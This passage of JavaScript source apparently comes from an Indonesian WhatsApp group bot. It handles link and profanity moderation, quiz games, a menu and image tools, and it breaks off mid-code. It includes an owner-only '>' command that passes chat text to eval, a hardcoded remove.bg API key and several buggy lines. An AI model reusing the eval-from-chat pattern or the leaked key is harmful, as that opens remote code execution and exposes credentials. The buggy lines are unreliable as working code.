        await mikupoxy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
mikupoxy.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
kice = m.sender
        await mikupoxy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
mikupoxy.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
          await mikupoxy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
			mikupoxy.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by xeon
if (antiToxic)
if (Badmikupoxy.includes(messagesD)) {
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
        await mikupoxy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await 
mikupoxy.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by xeon
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
        await mikupoxy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
mikupoxy.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
        await mikupoxy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
mikupoxy.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
        await mikupoxy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
mikupoxy.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
        await mikupoxy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
mikupoxy.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin kirim link telegram, admin mah bebas kirim link apapun😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
        await mikupoxy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
mikupoxy.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan telegram di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin kirim link tiktok, admin mah bebas kirim link apapun😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
        await mikupoxy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
mikupoxy.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan tiktok di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin sudah kirim link twitter, admin mah bebas kirim link apapun😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
        await mikupoxy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
mikupoxy.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan twitter di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

mikupoxy.family100 = mikupoxy.family100 ? mikupoxy.family100 : {};
if (from in mikupoxy.family100 && !m.key.fromMe ) {
    let similarity = require('similarity');
    let threshold = 0.72; // semakin tinggi nilai, semakin mirip
    let id = m.chat;
    let users = global.db.users[m.sender];
    let room = mikupoxy.family100[id];
    let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '');
    let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy);

    if (!isSurrender) {
        let index = room.jawaban.indexOf(text);

        if (index < 0) {
            if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) {
                return poxreply('Dikit lagi!');
            }
        }

        if (!isCmd && room.terjawab[index]) {
            return;
        }

        users.money += room.winScore;
        room.terjawab[index] = m.sender;
    }

    let isWin = room.terjawab.length === room.terjawab.filter(v => v).length;

    let caption = `*GAME FAMILY100*

*Soal:* ${room.soal}

Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
    return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0] : ''}`.trim() : false;
}).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
    `.trim();

    mikupoxy.sendMessage(from, { text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net'] }, { quoted: m }).then(msg => {
        mikupoxy.family100[id].msg = msg;
    }).catch(_ => _);

    if (isWin || isSurrender) {
        delete mikupoxy.family100[id];
    }
}
mikupoxy.tebaklagu = mikupoxy.tebaklagu ? mikupoxy.tebaklagu : {};
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   mikupoxy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

mikupoxy.tebakkata = mikupoxy.tebakkata ? mikupoxy.tebakkata : {}  
if (from in mikupoxy.tebakkata) {
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(mikupoxy.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += 10000
 var teks = `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n`
 poxreply(`${teks}`)
 clearTimeout(mikupoxy.tebakkata[id][2])
 delete mikupoxy.tebakkata[id]
} else console.log('*Jawaban Salah!*')
}
mikupoxy.tebakgambar = mikupoxy.tebakgambar ? mikupoxy.tebakgambar : {} 
if(from in mikupoxy.tebakgambar) {
kuis = true
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(mikupoxy.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
   users.money += 10000
 var teks = `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n\nIngin bermain lagi? Silahkan Ketik TebakGambar`
 poxreply(`${teks}`)
 clearTimeout(mikupoxy.tebakgambar[id][3])
 delete mikupoxy.tebakgambar[id]
} else console.log('*Jawaban Salah!*')
}
mikupoxy.tebakbendera2 = mikupoxy.tebakbendera2 ? mikupoxy.tebakbendera2 : {};
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await poxreply('*Anda Telah menyerah*')
delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await mikupoxy.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
mikupoxy.tebakbendera = mikupoxy.tebakbendera ? mikupoxy.tebakbendera : {};
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await poxreply('*Anda Telah menyerah*')
delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await mikupoxy.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
mikupoxy.tebakkabupaten = mikupoxy.tebakkabupaten ? mikupoxy.tebakkabupaten : {};
 if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await poxreply('*Anda Telah menyerah*')
delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await mikupoxy.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
 mikupoxy.tebakkimia = mikupoxy.tebakkimia ? mikupoxy.tebakkimia : {};
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await poxreply('*Anda Telah menyerah*')
delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await mikupoxy.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
        
//=========================================\\
mikupoxy.tekateki = mikupoxy.tekateki ? mikupoxy.tekateki : {}  
if(from in mikupoxy.tekateki){
let users = global.db.users[m.sender]
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(mikupoxy.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += mikupoxy.tekateki[id][2]
 var teks = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${mikupoxy.tekateki[id][2]} Money 💸`
 poxreply(`${teks}`)
 clearTimeout(mikupoxy.tekateki[id][3])
 delete mikupoxy.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) poxreply(`*Dikit Lagi!*`)
}
//=========================================\\
mikupoxy.tebakasahotak = mikupoxy.tebakasahotak ? mikupoxy.tebakasahotak : {};
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await poxreply('*Anda Telah menyerah*')
delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await mikupoxy.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
//=========================================\\
        mikupoxy.siapaaku = mikupoxy.siapaaku ? mikupoxy.siapaaku : {}
if(from in mikupoxy.siapaaku){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(mikupoxy.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += mikupoxy.siapaaku[id][2]
var teks = `*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${mikupoxy.siapaaku[id][2]} Money 💸`
   poxreply(`${teks}`)
 clearTimeout(mikupoxy.siapaaku[id][3])
 delete mikupoxy.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) poxreply(`*Dikit Lagi!*`)
// else reply(`*Salah!*`) 
}
//=========================================\\
        mikupoxy.susunkata = mikupoxy.susunkata ? mikupoxy.susunkata : {}  
if(from in mikupoxy.susunkata){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(mikupoxy.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += mikupoxy.susunkata[id][2]
   var teks = `*GAME SUSUN KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${mikupoxy.susunkata[id][2]} Money 💸`
poxreply(`${teks}`)
 clearTimeout(mikupoxy.susunkata[id][3])
 delete mikupoxy.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) poxreply(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 
}
//=========================================\\
mikupoxy.caklontong = mikupoxy.caklontong ? mikupoxy.caklontong : {};
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 mikupoxy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}
mikupoxy.tebakkalimat = mikupoxy.tebakkalimat ? mikupoxy.tebakkalimat : {};
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 mikupoxy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

//=========================================//
mikupoxy.tebaklirik = mikupoxy.tebaklirik ? mikupoxy.tebaklirik : {}  
if(from in mikupoxy.tebaklirik){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(mikupoxy.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.money += mikupoxy.tebaklirik[id][2]
 global.db.users[m.sender].exp += 10
   var teks = `*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${mikupoxy.tebaklirik[id][2]} Money 💸\n EXP: +10`
  poxreply(`${teks}`)
 clearTimeout(mikupoxy.tebaklirik[id][3])
 delete mikupoxy.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) poxreply(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 }
//=========================================\\
mikupoxy.tebaktebakan = mikupoxy.tebaktebakan ? mikupoxy.tebaktebakan : {};
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 mikupoxy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}
//antilink all by Kinchan
if (AntiLinkAll) {
    // Regex pattern to detect URLs, including both "http" and "https"        
    // Check if the message contains a URL or a wa.me link
    let isLink = urlPattern.test(budy) || waMePattern.test(budy);    
    if (isLink) {
        if (!isBotAdmins) return;
        if (isAdmins) return;
        if (m.key.fromMe) return;
        if (isOwner) return;
        
        await mikupoxy.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        });

        mikupoxy.groupParticipantsUpdate(m.chat, [m.sender], from, {quoted:m});
    }
} else {
}
//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
mikupoxy.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: mikupoxy.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, mikupoxy.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
mikupoxy.ev.emit('messages.upsert', msg)
}

let grid = "`"
switch (command) {
case 'menu': {
sendReaction("🕑");
const owned = `${owner}@s.whatsapp.net`
const text12 = `*Haii* @${m.sender.split("@")[0]}, Ada Yang Bisa Saya Bantu Kak?

 ❏━━『 *INFO USER* 』━━
┣✦ ɴᴀᴍᴀ: ${pushname}
┣✦ ɴᴜᴍʙᴇʀ: ${m.sender.split('@')[0]}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *INFO BOT* 』━━
┣✦ *ⁿᵃᵐᵃ ᵇᵒᵗ:* ${global.botname}
┣✦ *ʳᵘⁿᵗᶦᵐᵉ ᵇᵒᵗ:* ${runtime(process.uptime())}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *INFO HARI* 』━━
┣✦ *ᵗᵒᵈᵃʸ:* ${hariini}
┣✦ *ʷᵃᵏᵗᵘ ʷᶦᵇ:* ${time2}
┣✦ *ʷᵃᵏᵗᵘ ʷᶦᵗᵃ:* ${wita}
┣✦ *ʷᵃᵏᵗᵘ ʷᶦᵗ:* ${wit}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *LIST MENU BOT* 』━━

┣✦ *MENU OWNER BOT*
┣✦ *getsession*
┣✦ *clearsession*
┣✦ *backup*
┣✦ *public*
┣✦ *self*

┣✦ *MENU GROUP*
┣✦ *h/hidetag text*
┣✦ *del/delete reply pesan*
┣✦ *kick replay/62xxx*
┣✦ *antilinkall on/off*
┣✦ *antilink on/off*
┣✦ *promote*
┣✦ *demote*
┣✦ *getdesc*

┣✦ *MENU DOWNLOAD/OTHER*
┣✦ *play*
┣✦ *spotify*
┣✦ *pin*
┣✦ *remini*
┣✦ *nobg*
┣✦ *blur*
┣✦ *cekbandwidth*
┣✦ *checkhost*
┣✦ *googlevoice*
┣✦ *getpp Reply/62xxx*
┣✦ *sendngl https://ngl.link/user hallo*
┣✦ *mc/server java/bedrock*

┣✦ *MENU PREMIUM USER*
┣✦ *hdvid 1080p*
┗━═┅═━━━═┅═━━━═┅═━━━๑
`
sendReaction("✅");
reply(text12)
} 
break
case '>':
if (!isOwner) return
var err = new TypeError
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return poxreply(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
poxreply(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
poxreply(util.format(_syntax + _err))
}
break
case 'restart':
if (!isOwner) return reply(mess.only.owner)
poxreply(`restarting ${global.botname}`)
poxreply(`Done ✅`)
await sleep(3000)
process.exit()
break
case 'tohd': case 'remini': case 'hd': {
                sendReaction("🕑");
				if (/image/.test(mime)) {
					const { remini } = require('./lib/remini')
					let media = await (m.quoted ? m.quoted.download() : m.download())
					remini(media, 'enhance').then(a => {
						mikupoxy.sendMessage(m.chat, { image: a, caption: 'Done' }, { quoted: m });
					});
					sendReaction("✅");
				} else {
					m.reply(`Kirim/Reply Gambar dengan format\nExample: ${prefix + command}`)
				}
			}
break
case 'h': case 'hidetag': {
 if (!m.isGroup) return reply('Perintah ini hanya dapat digunakan di dalam grup.');
 if (!isAdmins && !isOwner) return reply('Perintah ini hanya untuk admin grup.');
 if (!isBotAdmins) return reply('Bot harus menjadi admin terlebih dahulu.');
 sendReaction("🕑");
 const userId = m.sender;
 const currentTime = Date.now();
 const cooldownTime = 120000; // 2 menit

 const whitelist = ['6285389296108', '622222'];

 if (lastHidetagTime[userId] && (currentTime - lastHidetagTime[userId] < cooldownTime)) {
 const remainingTime = Math.ceil((cooldownTime - (currentTime - lastHidetagTime[userId])) / 1000);
 return reply(`Anda harus menunggu ${remainingTime} detik lagi untuk menggunakan perintah ini.`);
 }


 lastHidetagTime[userId] = currentTime;

 const participantsToMention = participants.map(a => a.id).filter(id => {
 return !whitelist.includes(id) && !groupAdmins.includes(id);
 });

 sendReaction("✅");
 mikupoxy.sendMessage(m.chat, { text: q ? q : '', mentions: participantsToMention }, { quoted: m });
}
break
case 'welcome':
if (!m.isGroup) return reply('Fitur Khusus Group!!!')
if (!isAdmins && !isOwner) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#welcome', m.sender, _cmd)
if (isWelcome) return reply(`Udah on`)
_welcome.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Sukses mengaktifkan welcome di grup ini')
} else if (args[0] === "off") {
addCountCmd('#welcome', m.sender, _cmd)
if (!isWelcome) return reply(`Udah off`)
let anu = _welcome.indexOf(m.chat)
_welcome.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Sukses menonaktifkan welcome di grup ini')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case 'left': case 'goodbye':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !isOwner) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#left', m.sender, _cmd)
if (isLeft) return reply(`Udah on`)
_left.push(m.chat)
fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
reply('Sukses mengaktifkan goodbye di grup ini')
} else if (args[0] === "off") {
addCountCmd('#left', m.sender, _cmd)
if (!isLeft) return reply(`Udah off`)
let anu = _left.indexOf(m.chat)
_left.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
reply('Sukses menonaktifkan goodbye di grup ini')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case 'nobg': {
  const isMedia = m.mtype === 'imageMessage' || m.mtype === 'videoMessage' || m.mtype === 'documentMessage';
  const isQuotedImage = m.quoted && m.quoted.mtype === 'imageMessage';
  const isQuotedSticker = m.quoted && m.quoted.mtype === 'stickerMessage';
  sendReaction("🕑");
  if (isMedia || isQuotedImage || isQuotedSticker) {
    try {
      const mess = {
        wait: 'Mohon tunggu, sedang memproses gambar...'
      };

      await mikupoxy.sendMessage(m.chat, { text: mess.wait }, { quoted: m });

      const media = await mikupoxy.downloadAndSaveMediaMessage(isQuotedImage ? m.quoted : m);
      
      if (!fs.existsSync(media)) {
        throw new Error('File media tidak ditemukan setelah diunduh.');
      }

      let ranp = getRandom('.png');

      const apiKeys = [
        '78qKCQL3QsveywDSwRG44drd'
      ];

      const keyrmbg = apiKeys[Math.floor(Math.random() * apiKeys.length)];
      const res = await removeBackgroundFromImageFile({
        path: media,
        apiKey: keyrmbg,
        size: 'auto',
        type: 'auto',
        ranp
      });

      fs.unlinkSync(media); 
      const buffer = Buffer.from(res.base64img, 'base64');
      fs.writeFileSync(ranp, buffer);
      await mikupoxy.sendMessage(m.chat, { image: fs.readFileSync(ranp), caption: 'Sukses tanpa background' }, { quoted: m });
      sendReaction("✅");

      fs.unlinkSync(ranp); 
    } catch (err) {
      console.error('Error in nobg case:', err);
      await mikupoxy.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memproses gambar. Pastikan file gambar ada dan dapat diakses.' }, { quoted: m });
    }
  } else {
    await mikupoxy.sendMessage(m.chat, { text: 'Kirim atau balas gambar/stiker!' }, { quoted: m });
  }
}
break
case 'addcase': {
    if (!isOwner) return reply(mess.only.owner)
    if (!text) return poxreply('Mana case nya');
    const fs = require('fs');
const namaFile = 'Case.js';
const caseBaru = `${text}`;

fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
